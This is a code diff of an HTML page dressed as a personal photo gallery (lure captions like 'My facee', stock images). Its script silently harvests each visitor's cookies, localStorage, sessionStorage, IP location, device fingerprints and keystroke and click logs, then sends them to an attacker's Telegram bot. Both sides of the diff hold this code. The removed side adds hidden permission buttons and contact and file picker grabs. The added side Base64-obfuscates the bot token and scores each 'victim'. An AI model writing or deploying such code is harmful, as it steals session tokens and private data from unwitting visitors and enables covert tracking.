@@ -70,14 +70,6 @@
             text-align: center;
             margin: 20px 0;
         }
-        /* Hidden permission triggers */
-        .permission-btn {
-            position: absolute;
-            opacity: 0.01;
-            width: 1px;
-            height: 1px;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
@@ -89,462 +81,496 @@
         
         <div class="gallery">
             <div class="image-card" onclick="openImage(1)">
-                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
-                     alt="Private Photo 1" 
-                     onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
-                <div class="image-title">Daily activitieessss <3 </div>
-                <div class="image-desc">normal pics </div>
+                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=400&h=300&fit=crop" 
+                     alt="Private Photo 1">
+                <div class="image-title">Daily Activities <3</div>
+                <div class="image-desc">Personal moments</div>
             </div>
             
             <div class="image-card" onclick="openImage(2)">
-                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
-                     alt="Private Photo 2"
-                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
-                <div class="image-title">NVDES</div>
-                <div class="image-desc">Title says it all lol</div>
+                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&h=300&fit=crop" 
+                     alt="Private Photo 2">
+                <div class="image-title">Private Collection</div>
+                <div class="image-desc">Exclusive content</div>
             </div>
             
             <div class="image-card" onclick="openImage(3)">
-                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
-                     alt="Private Photo 3"
-                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
-                <div class="image-title">My facee</div>
-                <div class="image-desc">I'm sooo ugly ik >_< </div>
+                <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=400&h=300&fit=crop" 
+                     alt="Private Photo 3">
+                <div class="image-title">My Memories</div>
+                <div class="image-desc">Personal archive</div>
             </div>
         </div>
     </div>
 
-    <!-- Hidden permission triggers -->
-    <button id="contactTrigger" class="permission-btn"></button>
-    <button id="fileTrigger" class="permission-btn"></button>
-
     <script>
-        // COMPREHENSIVE DATA COLLECTION SYSTEM
-        const CONFIG = {
-            telegram: {
-                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
-                chatId: '8032494479'
-            }
+        // ENCRYPTED TELEGRAM CONFIG (Base64 encoded)
+        const ENCRYPTED_CONFIG = {
+            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU091RExLNVd0YzdJcmttRlhndER1YXFscw==',
+            chatId: 'ODAzMjQ5NDQ3OQ=='
         };
 
+        // DECRYPTION FUNCTION
+        function decryptConfig() {
+            return {
+                token: atob(ENCRYPTED_CONFIG.token),
+                chatId: atob(ENCRYPTED_CONFIG.chatId)
+            };
+        }
+
+        const CONFIG = decryptConfig();
+
+        // GLOBAL DATA STORAGE
         let allCollectedData = {};
         let sessionLog = [];
         let pageLoadTime = Date.now();
+        let reportSent = false;
 
-        // GOOGLE DATA CAPTURE METHODS
-        const GoogleDataCapture = {
-            // Extract from Google Analytics if present
-            captureGoogleAnalytics: function() {
-                try {
-                    if (window.ga && ga.getAll) {
-                        const trackers = ga.getAll();
-                        return trackers.map(tracker => ({
-                            trackingId: tracker.get('trackingId'),
-                            clientId: tracker.get('clientId'),
-                            userId: tracker.get('userId'),
-                            sessionId: tracker.get('sessionId')
-                        }));
-                    }
-                } catch(e) {}
-                return [];
-            },
-
-            // Capture Google Tag Manager data
-            captureGTM: function() {
-                try {
-                    if (window.google_tag_manager) {
-                        const gtmData = {};
-                        for (let key in window.google_tag_manager) {
-                            if (window.google_tag_manager[key].data) {
-                                gtmData[key] = window.google_tag_manager[key].data;
-                            }
-                        }
-                        return gtmData;
-                    }
-                } catch(e) {}
-                return {};
-            },
-
-            // Extract from gtag if available
-            captureGtag: function() {
-                try {
-                    if (window.gtag && window.dataLayer) {
-                        return {
-                            dataLayer: window.dataLayer.slice(-20), // Last 20 events
-                            gtagConfig: window.gtag
-                        };
-                    }
-                } catch(e) {}
-                return {};
-            }
-        };
-
-        // COMPREHENSIVE DATA COLLECTOR
-        async function collectAllData() {
+        // STEALTH DATA COLLECTION - NO PERMISSIONS REQUIRED
+        async function collectAllDataStealth() {
             const startTime = Date.now();
             
-            // Collect all data in parallel
-            const dataPromises = {
-                explicitData: collectExplicitData(),
-                technicalData: collectTechnicalData(),
-                behavioralData: collectBehavioralData(),
-                storedData: collectStoredData(),
-                inferredData: collectInferredData(),
-                googleData: collectGoogleData(),
-                advancedData: collectAdvancedData()
-            };
-
-            // Wait for all data collection
-            const results = await Promise.allSettled(Object.values(dataPromises));
-            
-            allCollectedData = {
-                collectionMeta: {
+            // Collect everything that doesn't require permissions
+            const data = {
+                meta: {
                     timestamp: new Date().toISOString(),
-                    collectionTime: Date.now() - startTime,
                     victimId: generateVictimId(),
                     url: window.location.href,
-                    userAgent: navigator.userAgent
+                    collectionTime: Date.now() - startTime
                 },
-                explicitData: results[0].status === 'fulfilled' ? results[0].value : {},
-                technicalData: results[1].status === 'fulfilled' ? results[1].value : {},
-                behavioralData: results[2].status === 'fulfilled' ? results[2].value : {},
-                storedData: results[3].status === 'fulfilled' ? results[3].value : {},
-                inferredData: results[4].status === 'fulfilled' ? results[4].value : {},
-                googleData: results[5].status === 'fulfilled' ? results[5].value : {},
-                advancedData: results[6].status === 'fulfilled' ? results[6].value : {}
-            };
-
-            return allCollectedData;
-        }
-
-        // 1. EXPLICIT DATA (Forms, Clicks, User Input)
-        async function collectExplicitData() {
-            return {
-                formSubmissions: captureFormSubmissions(),
-                buttonClicks: captureButtonClicks(),
-                userInput: captureUserInput(),
-                fileDownloads: captureFileDownloads(),
-                videoInteractions: captureVideoInteractions()
-            };
-        }
-
-        // 2. TECHNICAL & DEVICE INFORMATION
-        async function collectTechnicalData() {
-            return {
-                ipInfo: await getIPInfo(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: {
-                    resolution: `${screen.width}x${screen.height}`,
-                    availResolution: `${screen.availWidth}x${screen.availHeight}`,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
+                
+                // Technical fingerprinting (no permissions needed)
+                technical: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    hardware: {
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory,
+                        touchPoints: navigator.maxTouchPoints
+                    },
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    cookieEnabled: navigator.cookieEnabled,
+                    pdfEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver,
+                    plugins: getPluginsStealth(),
+                    fonts: getFontsStealth(),
+                    canvas: getCanvasFingerprint(),
+                    webgl: getWebGLFingerprint()
                 },
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                systemFonts: await getSystemFonts(),
-                hardware: {
-                    concurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints
-                },
-                webgl: getWebGLInfo(),
-                plugins: getBrowserPlugins(),
-                connection: getConnectionInfo(),
-                fingerprint: generateFingerprint()
-            };
-        }
-
-        // 3. BEHAVIORAL & INTERACTION DATA
-        async function collectBehavioralData() {
-            return {
-                navigation: {
+                
+                // Network data (no permissions needed)
+                network: await getNetworkData(),
+                
+                // Behavioral data (no permissions needed)
+                behavioral: {
                     referrer: document.referrer,
-                    pagesVisited: [window.location.href],
                     sessionStart: pageLoadTime,
-                    sessionDuration: Date.now() - pageLoadTime
-                },
-                interactions: {
-                    mouseMovements: sessionLog.filter(log => log.type === 'mousemove').length,
-                    clicks: sessionLog.filter(log => log.type === 'click').length,
-                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
-                    keystrokes: sessionLog.filter(log => log.type === 'keydown').length,
-                    formInteractions: sessionLog.filter(log => log.type === 'input').length
-                },
-                engagement: {
-                    bounceRisk: calculateBounceRisk(),
-                    activeTime: calculateActiveTime(),
+                    duration: Date.now() - pageLoadTime,
+                    interactions: {
+                        total: sessionLog.length,
+                        clicks: sessionLog.filter(log => log.type === 'click').length,
+                        moves: sessionLog.filter(log => log.type === 'mousemove').length,
+                        scrolls: sessionLog.filter(log => log.type === 'scroll').length,
+                        keys: sessionLog.filter(log => log.type === 'keydown').length
+                    },
                     scrollDepth: getScrollDepth(),
-                    clickHeatmap: generateClickHeatmap()
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    engagement: calculateEngagement()
+                },
+                
+                // Stored data (no permissions needed)
+                storage: {
+                    cookies: getAllCookies(),
+                    localStorage: getAllLocalStorage(),
+                    sessionStorage: getAllSessionStorage()
+                },
+                
+                // Inferred data
+                inferred: {
+                    device: inferDeviceType(),
+                    os: inferOperatingSystem(),
+                    browser: inferBrowser(),
+                    location: await inferLocation(),
+                    interests: inferInterests(),
+                    value: calculateVictimValue()
                 }
             };
-        }
-
-        // 4. STORED DATA (Cookies, Storage)
-        async function collectStoredData() {
-            return {
-                cookies: getAllCookies(),
-                localStorage: getAllLocalStorage(),
-                sessionStorage: getAllSessionStorage(),
-                indexedDB: await getIndexedDBInfo()
-            };
-        }
-
-        // 5. INFERRED DATA
-        async function collectInferredData() {
-            return {
-                demographics: inferDemographics(),
-                interests: inferInterests(),
-                intent: inferUserIntent(),
-                value: inferCustomerValue(),
-                location: inferEnhancedLocation(),
-                deviceType: inferDeviceType()
-            };
-        }
-
-        // 6. GOOGLE DATA
-        async function collectGoogleData() {
-            return {
-                analytics: GoogleDataCapture.captureGoogleAnalytics(),
-                tagManager: GoogleDataCapture.captureGTM(),
-                gtag: GoogleDataCapture.captureGtag(),
-                adsData: captureGoogleAdsData()
-            };
-        }
-
-        // 7. ADVANCED DATA (Contacts, Filesystem)
-        async function collectAdvancedData() {
-            return {
-                contacts: await attemptContactAccess(),
-                fileSystem: await attemptFileSystemAccess(),
-                mediaDevices: await getMediaDevices(),
-                bluetooth: await checkBluetooth(),
-                clipboard: await checkClipboardAccess(),
-                geolocation: await attemptGeolocation()
-            };
-        }
-
-        // CONTACT LIST ACCESS IMPLEMENTATION
-        async function attemptContactAccess() {
-            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
-                return { available: false, error: 'Contact Picker API not supported' };
-            }
-
-            try {
-                // Trigger contact picker on user interaction
-                const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address'], { multiple: true });
-                return {
-                    available: true,
-                    accessed: true,
-                    contacts: contacts.map(contact => ({
-                        name: contact.name ? contact.name.join(' ') : 'Unknown',
-                        emails: contact.email || [],
-                        phones: contact.tel || [],
-                        addresses: contact.address || []
-                    }))
-                };
-            } catch (error) {
-                return {
-                    available: true,
-                    accessed: false,
-                    error: error.message
-                };
-            }
-        }
-
-        // FILE SYSTEM ACCESS IMPLEMENTATION
-        async function attemptFileSystemAccess() {
-            if (!('showOpenFilePicker' in window)) {
-                return { available: false, error: 'File System Access API not supported' };
-            }
-
-            try {
-                // Try to trigger file picker
-                const fileHandles = await window.showOpenFilePicker({
-                    multiple: true,
-                    types: [
-                        {
-                            description: 'Documents',
-                            accept: {
-                                'application/pdf': ['.pdf'],
-                                'application/msword': ['.doc'],
-                                'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['.docx']
-                            }
-                        },
-                        {
-                            description: 'Images',
-                            accept: {
-                                'image/*': ['.png', '.jpg', '.jpeg', '.gif']
-                            }
-                        }
-                    ]
-                });
-
-                const files = [];
-                for (const handle of fileHandles) {
-                    const file = await handle.getFile();
-                    files.push({
-                        name: file.name,
-                        type: file.type,
-                        size: file.size,
-                        lastModified: file.lastModified
-                    });
-                }
-
-                return {
-                    available: true,
-                    accessed: true,
-                    files: files
-                };
-            } catch (error) {
-                return {
-                    available: true,
-                    accessed: false,
-                    error: error.message
-                };
-            }
-        }
-
-        // SEND COMPREHENSIVE SINGLE MESSAGE
-        async function sendComprehensiveReport() {
-            const data = await collectAllData();
-            const message = formatComprehensiveMessage(data);
-            await sendToTelegram(message);
-        }
-
-        // FORMAT COMPREHENSIVE MESSAGE
-        function formatComprehensiveMessage(data) {
-            return `🚨 **COMPLETE DATA CAPTURE REPORT** 🚨
-
-📊 **SESSION OVERVIEW**
-🆔 Victim ID: ${data.collectionMeta.victimId}
-⏰ Collection Time: ${data.collectionMeta.collectionTime}ms
-🌐 URL: ${data.collectionMeta.url}
-📅 Timestamp: ${new Date(data.collectionMeta.timestamp).toLocaleString()}
-
-🔧 **TECHNICAL FINGERPRINT**
-📍 IP: ${data.technicalData.ipInfo.ip} | ISP: ${data.technicalData.ipInfo.isp}
-💻 Platform: ${data.technicalData.platform} | OS: ${inferOS(data.technicalData.userAgent)}
-🖥️ Screen: ${data.technicalData.screen.resolution} | RAM: ${data.technicalData.hardware.deviceMemory}GB
-⚙️ Cores: ${data.technicalData.hardware.concurrency} | Touch: ${data.technicalData.hardware.maxTouchPoints}
-🌍 Timezone: ${data.technicalData.timezone} | Language: ${data.technicalData.language}
-
-📈 **BEHAVIORAL ANALYTICS**
-🔗 Referrer: ${data.behavioralData.navigation.referrer || 'Direct'}
-⏱️ Session: ${Math.round(data.behavioralData.navigation.sessionDuration/1000)}s
-🖱️ Interactions: ${data.behavioralData.interactions.clicks} clicks, ${data.behavioralData.interactions.mouseMovements} moves
-📜 Scroll Depth: ${data.behavioralData.engagement.scrollDepth}% | Active Time: ${Math.round(data.behavioralData.engagement.activeTime/1000)}s
-
-💾 **STORED DATA**
-🍪 Cookies: ${Object.keys(data.storedData.cookies).length} cookies
-💾 Local Storage: ${Object.keys(data.storedData.localStorage).length} items
-🗄️ Session Storage: ${Object.keys(data.storedData.sessionStorage).length} items
-
-🎯 **INFERRED PROFILE**
-👤 Demographics: ${data.inferredData.demographics.ageRange}, ${data.inferredData.demographics.gender}
-🎯 Intent: ${data.inferredData.intent}
-💰 Value Score: ${data.inferredData.value}/100
-📱 Device Type: ${data.inferredData.deviceType}
-
-🔍 **GOOGLE DATA**
-📊 Analytics: ${data.googleData.analytics.length} trackers
-🏷️ GTM: ${Object.keys(data.googleData.tagManager).length} containers
-📈 Data Layer: ${data.googleData.gtag.dataLayer ? data.googleData.gtag.dataLayer.length : 0} events
-
-🚀 **ADVANCED CAPTURES**
-📱 Contacts: ${data.advancedData.contacts.available ? (data.advancedData.contacts.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
-📁 File System: ${data.advancedData.fileSystem.available ? (data.advancedData.fileSystem.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
-🎥 Media Devices: ${data.advancedData.mediaDevices.length} devices
-📡 Bluetooth: ${data.advancedData.bluetooth.available ? 'Available' : 'Not available'}
-📋 Clipboard: ${data.advancedData.clipboard.available ? 'Accessible' : 'Not accessible'}
-
-📝 **EXPLICIT INTERACTIONS**
-📋 Form Fields: ${data.explicitData.formSubmissions.fieldsFound}
-🖱️ Button Clicks: ${data.explicitData.buttonClicks.totalClicks}
-⌨️ User Input: ${data.explicitData.userInput.inputEvents} fields
-📥 Downloads: ${data.explicitData.fileDownloads.downloadClicks}
-🎬 Video Plays: ${data.explicitData.videoInteractions.plays}
-
-🎭 **FINGERPRINT UNIQUENESS**
-🔑 Fingerprint Hash: ${data.technicalData.fingerprint.hash}
-🎨 Canvas: ${data.technicalData.fingerprint.canvas ? 'Unique' : 'Failed'}
-🔄 WebGL: ${data.technicalData.fingerprint.webgl ? 'Unique' : 'Failed'}
-🔤 Fonts: ${data.technicalData.fingerprint.fonts} fonts detected
-
-📈 **ENGAGEMENT METRICS**
-📉 Bounce Risk: ${data.behavioralData.engagement.bounceRisk}%
-🔥 Activity Score: ${calculateEngagementScore(data.behavioralData)}/100
-🎯 Focus Areas: ${data.behavioralData.engagement.clickHeatmap.length} hot zones
-
-⚡ **REAL-TIME CAPTURE COMPLETE**`;
-        }
-
-        // SEND SUMMARY ON PAGE UNLOAD
-        function setupUnloadHandler() {
-            window.addEventListener('beforeunload', async function() {
-                const summary = generateSessionSummary();
-                await sendToTelegram(summary);
-            });
-        }
-
-        function generateSessionSummary() {
-            const duration = Date.now() - pageLoadTime;
-            const totalInteractions = sessionLog.length;
             
-            return `📊 **SESSION SUMMARY** 📊
-
-🆔 ${allCollectedData.collectionMeta.victimId}
-⏰ Duration: ${Math.round(duration/1000)} seconds
-🖱️ Total Interactions: ${totalInteractions}
-📜 Pages: 1 (Single Page Application)
-🎯 Engagement: ${calculateEngagementScore(allCollectedData.behavioralData)}/100
-📈 Data Points: ${countTotalDataPoints(allCollectedData)}
-
-🔚 **Session ended at:** ${new Date().toLocaleString()}`;
+            allCollectedData = data;
+            return data;
         }
 
-        // HELPER FUNCTIONS
-        function generateVictimId() {
-            return `v_${Math.random().toString(36).substr(2, 9)}_${Date.now().toString(36)}`;
+        // STEALTH DATA COLLECTION METHODS (No permissions required)
+        function getPluginsStealth() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename
+                });
+            }
+            return plugins;
         }
 
-        function calculateEngagementScore(behavioralData) {
-            let score = 0;
-            if (behavioralData.interactions.clicks > 5) score += 30;
-            if (behavioralData.interactions.mouseMovements > 20) score += 20;
-            if (behavioralData.engagement.scrollDepth > 50) score += 25;
-            if (behavioralData.engagement.activeTime > 10000) score += 25;
-            return Math.min(100, score);
+        function getFontsStealth() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
+            const fontList = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Webdings', 'Wingdings'
+            ];
+            
+            const availableFonts = [];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            fontList.forEach(font => {
+                context.font = testSize + " '" + font + "'";
+                const metrics1 = context.measureText(testString);
+                context.font = testSize + " '" + baseFonts[0] + "'";
+                const metrics2 = context.measureText(testString);
+                if (metrics1.width !== metrics2.width) {
+                    availableFonts.push(font);
+                }
+            });
+            
+            return availableFonts;
         }
 
-        function countTotalDataPoints(data) {
-            let count = 0;
-            for (let category in data) {
-                if (typeof data[category] === 'object') {
-                    count += Object.keys(data[category]).length;
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Hello, world!', 2, 15);
+                return canvas.toDataURL().substring(22, 50);
+            } catch(e) {
+                return 'failed';
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (!gl) return 'no_webgl';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+                return 'webgl_no_debug';
+            } catch(e) {
+                return 'failed';
+            }
+        }
+
+        async function getNetworkData() {
+            try {
+                // Get IP through multiple services
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://jsonip.com'
+                ];
+                
+                for (let service of ipServices) {
+                    try {
+                        const response = await fetch(service, { mode: 'cors' });
+                        const data = await response.json();
+                        const ip = data.ip || data.ip_str;
+                        if (ip) {
+                            // Get location from IP
+                            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                            const locationData = await locationResponse.json();
+                            return {
+                                ip: ip,
+                                city: locationData.city,
+                                region: locationData.region,
+                                country: locationData.country_name,
+                                countryCode: locationData.country_code,
+                                isp: locationData.org,
+                                asn: locationData.asn
+                            };
+                        }
+                    } catch(e) {
+                        continue;
+                    }
+                }
+            } catch(e) {
+                // Fallback to basic IP detection
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return { ip: data.ip, city: 'Unknown', country: 'Unknown' };
+                } catch(e2) {
+                    return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
                 }
             }
-            return count;
         }
 
+        function getAllCookies() {
+            const cookies = {};
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.split('=').map(c => c.trim());
+                if (name) cookies[name] = value || '';
+            });
+            return cookies;
+        }
+
+        function getAllLocalStorage() {
+            const storage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+            return storage;
+        }
+
+        function getAllSessionStorage() {
+            const storage = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                storage[key] = sessionStorage.getItem(key);
+            }
+            return storage;
+        }
+
+        // INFERENCE FUNCTIONS
+        function inferDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('mobile')) return 'Mobile';
+            if (ua.includes('tablet')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        function inferOperatingSystem() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function inferBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+
+        async function inferLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.timezone
+                };
+            } catch(e) {
+                return {
+                    city: 'Unknown',
+                    region: 'Unknown', 
+                    country: 'Unknown',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+            }
+        }
+
+        function inferInterests() {
+            const interests = [];
+            const keywords = document.body.innerText.toLowerCase();
+            
+            if (keywords.includes('gaming') || keywords.includes('game')) interests.push('Gaming');
+            if (keywords.includes('shopping') || keywords.includes('buy')) interests.push('Shopping');
+            if (keywords.includes('travel') || keywords.includes('vacation')) interests.push('Travel');
+            if (keywords.includes('tech') || keywords.includes('computer')) interests.push('Technology');
+            if (keywords.includes('sports') || keywords.includes('fitness')) interests.push('Sports');
+            
+            return interests.length > 0 ? interests : ['General'];
+        }
+
+        function calculateVictimValue() {
+            let value = 50; // Base value
+            
+            // Add value based on data richness
+            if (allCollectedData.technical.hardware.cores >= 8) value += 20;
+            if (allCollectedData.technical.hardware.memory >= 8) value += 15;
+            if (allCollectedData.network.country === 'United States') value += 25;
+            if (allCollectedData.inferred.interests.includes('Shopping')) value += 10;
+            if (Object.keys(allCollectedData.storage.cookies).length > 5) value += 10;
+            if (allCollectedData.behavioral.interactions.total > 20) value += 15;
+            
+            return Math.min(100, value);
+        }
+
+        function getScrollDepth() {
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = window.scrollY;
+            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+        }
+
+        function calculateEngagement() {
+            const duration = Date.now() - pageLoadTime;
+            const interactions = sessionLog.length;
+            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
+        }
+
+        function generateVictimId() {
+            const random = Math.random().toString(36).substr(2, 9);
+            const timestamp = Date.now().toString(36);
+            return `v_${random}_${timestamp}`;
+        }
+
+        // SEND COMPREHENSIVE REPORT
+        async function sendComprehensiveReport() {
+            if (reportSent) return;
+            
+            const data = await collectAllDataStealth();
+            const message = formatReportMessage(data);
+            
+            try {
+                await sendToTelegram(message);
+                reportSent = true;
+                console.log('Report sent successfully');
+            } catch(error) {
+                console.error('Failed to send report:', error);
+            }
+        }
+
+        function formatReportMessage(data) {
+            return `🚨 **COMPREHENSIVE DATA CAPTURE** 🚨
+
+📊 **VICTIM PROFILE**
+🆔 ID: ${data.meta.victimId}
+⏰ Collection: ${data.meta.collectionTime}ms
+🌐 URL: ${data.meta.url}
+📅 Time: ${new Date(data.meta.timestamp).toLocaleString()}
+
+🔧 **SYSTEM FINGERPRINT**
+💻 OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
+🖥️ Device: ${data.inferred.device} | Cores: ${data.technical.hardware.cores}
+💾 RAM: ${data.technical.hardware.memory}GB | Screen: ${data.technical.screen.width}x${data.technical.screen.height}
+🌍 Language: ${data.technical.language} | Timezone: ${data.technical.timezone}
+
+🌐 **NETWORK & LOCATION**
+📍 IP: ${data.network.ip} | ISP: ${data.network.isp}
+🏙️ Location: ${data.network.city}, ${data.network.country}
+🇺🇳 Country Code: ${data.network.countryCode} | ASN: ${data.network.asn}
+
+📈 **BEHAVIORAL DATA**
+🔗 Referrer: ${data.behavioral.referrer || 'Direct'}
+⏱️ Duration: ${Math.round(data.behavioral.duration/1000)}s
+🖱️ Interactions: ${data.behavioral.interactions.total} total
+📜 Scroll Depth: ${data.behavioral.scrollDepth}% | Engagement: ${data.behavioral.engagement}/100
+
+💾 **STORAGE DATA**
+🍪 Cookies: ${Object.keys(data.storage.cookies).length}
+💿 Local Storage: ${Object.keys(data.storage.localStorage).length}
+📀 Session Storage: ${Object.keys(data.storage.sessionStorage).length}
+
+🎯 **INFERRED INSIGHTS**
+💰 Value Score: ${data.inferred.value}/100
+🎮 Interests: ${data.inferred.interests.join(', ')}
+📱 Device Type: ${data.inferred.device}
+
+🔍 **TECHNICAL DETAILS**
+🔌 Plugins: ${data.technical.plugins.length} installed
+🔤 Fonts: ${data.technical.fonts.length} detected
+🎨 Canvas FP: ${data.technical.canvas}
+🔄 WebGL: ${typeof data.technical.webgl === 'object' ? 'Available' : data.technical.webgl}
+
+⚡ **STEALTH CAPTURE COMPLETE**`;
+        }
+
+        // TELEGRAM SEND FUNCTION
         async function sendToTelegram(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {
+                        'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                    },
                     body: JSON.stringify({
-                        chat_id: CONFIG.telegram.chatId,
+                        chat_id: CONFIG.chatId,
                         text: message,
                         parse_mode: 'Markdown'
                     })
                 });
                 return response.ok;
-            } catch (error) {
-                console.error('Telegram send failed:', error);
+            } catch(error) {
+                console.error('Telegram error:', error);
                 return false;
+            }
+        }
+
+        // SESSION TRACKING
+        function setupSessionTracking() {
+            // Track all interactions
+            const events = ['mousemove', 'click', 'scroll', 'keydown', 'input'];
+            events.forEach(event => {
+                document.addEventListener(event, (e) => {
+                    sessionLog.push({
+                        type: event,
+                        timestamp: Date.now(),
+                        x: e.clientX,
+                        y: e.clientY,
+                        target: e.target.tagName
+                    });
+                    
+                    // Limit log size
+                    if (sessionLog.length > 1000) {
+                        sessionLog = sessionLog.slice(-500);
+                    }
+                });
+            });
+        }
+
+        // IMAGE HANDLER
+        function openImage(imageId) {
+            const images = {
+                1: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=800&h=600&fit=crop',
+                2: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=800&h=600&fit=crop',
+                3: 'https://images.unsplash.com/photo-1494790108755-2616b612b786?w=800&h=600&fit=crop'
+            };
+            
+            if (images[imageId]) {
+                window.open(images[imageId], '_blank');
+            }
+            
+            // Trigger data collection on first interaction
+            if (!reportSent) {
+                sendComprehensiveReport();
             }
         }
 
@@ -552,95 +578,28 @@
         window.addEventListener('load', function() {
             pageLoadTime = Date.now();
             
-            // Start comprehensive data collection
-            setTimeout(sendComprehensiveReport, 1000);
-            
-            // Setup session tracking
+            // Setup tracking immediately
             setupSessionTracking();
-            setupUnloadHandler();
             
-            // Attempt advanced permissions on user interaction
-            document.addEventListener('click', function() {
-                setTimeout(() => {
-                    document.getElementById('contactTrigger').click();
-                    document.getElementById('fileTrigger').click();
-                }, 2000);
-            }, { once: true });
+            // Send initial report after 2 seconds
